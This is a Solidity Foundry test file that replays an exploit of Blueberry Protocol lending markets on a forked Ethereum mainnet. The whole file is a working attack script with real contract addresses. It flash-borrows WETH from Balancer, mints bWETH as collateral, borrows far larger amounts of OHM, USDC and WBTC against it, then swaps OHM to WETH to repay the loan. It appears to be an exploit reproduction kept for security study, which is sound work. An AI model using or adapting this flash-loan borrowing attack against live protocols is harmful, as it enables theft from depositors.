// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/interface/interface.sol";
import "forge-std/console.sol";

interface IMarketFacet {
    function enterMarkets(
        address[] calldata vTokens
    ) external returns (uint256[] memory);
}

interface bBep20Interface {
    function transfer(address dst, uint amount) external returns (bool);

    function approve(address spender, uint amount) external returns (bool);

    function balanceOf(address owner) external view returns (uint);

    function mint(uint mintAmount) external returns (uint);

    function borrow(uint borrowAmount) external returns (uint);
}

contract ContractTest is Test {
    WETH9 private WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private OHM = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
    IERC20 private USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    bBep20Interface private bWETH =
        bBep20Interface(0x643d448CEa0D3616F0b32E3718F563b164e7eDd2);
    bBep20Interface private bOHM =
        bBep20Interface(0x08830038A6097C10f4A814274d5A68E64648d91c);
    bBep20Interface private bUSDC =
        bBep20Interface(0x649127D0800a8c68290129F091564aD2F1D62De1);
    bBep20Interface private bWBTC =
        bBep20Interface(0xE61ad5B0E40c856E6C193120Bd3fa28A432911B6);

    IMarketFacet BlueberryProtocol =
        IMarketFacet(0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2);

    IBalancerVault balancer =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    Uni_Router_V3 pool =
        Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function setUp() public {
        vm.createSelectFork("mainnet", 19287289 - 1);
        vm.label(address(this), "AttackContract");
        vm.label(address(WETH), "WETH");
        vm.label(address(OHM), "OHM");
        vm.label(address(USDC), "USDC");
        vm.label(address(WBTC), "WBTC");
        vm.label(address(bWETH), "bWETH");
        vm.label(address(bOHM), "bOHM");
        vm.label(address(bUSDC), "bUSDC");
        vm.label(address(bWBTC), "bWBTC");

        vm.label(address(BlueberryProtocol), "BlueberryProtocol");

        vm.label(address(balancer), "balancer");
        vm.label(address(pool), "pool");
    }

    function approveAll() internal {
        WETH.approve(address(bWETH), type(uint256).max);
        OHM.approve(address(pool), type(uint256).max);
    }

    receive() external payable {}

    fallback() external payable {}

    function testAttack() public {
        vm.deal(address(this), 1 ether);
        emit log_named_uint("WETH1 ", WETH.balanceOf(address(this)));
        WETH.deposit{value: 1 ether}();
        emit log_named_uint("WETH2 ", WETH.balanceOf(address(this)));
        emit log_named_uint("USDC ", USDC.balanceOf(address(this)));
        approveAll();
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000000000000000000;
        balancer.flashLoan(address(this), tokens, amounts, new bytes(1));
        emit log_named_uint("WETH3 ", WETH.balanceOf(address(this)));
        emit log_named_uint("bUSDC ", bUSDC.balanceOf(address(this)));
        emit log_named_uint("USDC ", USDC.balanceOf(address(this)));
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        address[] memory tokenList = new address[](1);
        tokenList[0] = address(bWETH);
        BlueberryProtocol.enterMarkets(tokenList);
        bWETH.mint(1000000000000000000);
        bOHM.borrow(8616071267266);
        bUSDC.borrow(913262603416);
        bWBTC.borrow(686690100);
        Uni_Router_V3.ExactOutputSingleParams memory params = Uni_Router_V3
            .ExactOutputSingleParams({
                tokenIn: address(OHM),
                tokenOut: address(WETH),
                fee: 3000,
                recipient: address(this),
                deadline: type(uint256).max,
                amountOut: 999999999999999999,
                amountInMaximum: type(uint256).max,
                sqrtPriceLimitX96: 0
            });
        pool.exactOutputSingle(params);
        WETH.transfer(address(balancer), 1000000000000000000);
    }
}
